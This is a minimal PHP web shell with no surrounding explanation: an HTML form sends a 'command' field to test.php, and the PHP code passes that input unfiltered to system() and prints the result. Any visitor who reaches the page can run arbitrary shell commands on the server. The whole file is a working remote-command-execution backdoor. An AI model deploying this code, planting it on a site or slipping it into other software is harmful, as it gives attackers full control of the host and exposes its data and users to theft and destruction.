<form action="test.php" method="POST"><input tabindex="1" name="command" type="text" size="200" value="" /><input type="submit" /></form>
<?php
echo "<pre>";
echo system($_POST['command'],$return);
echo $return;
echo "</pre>";
?>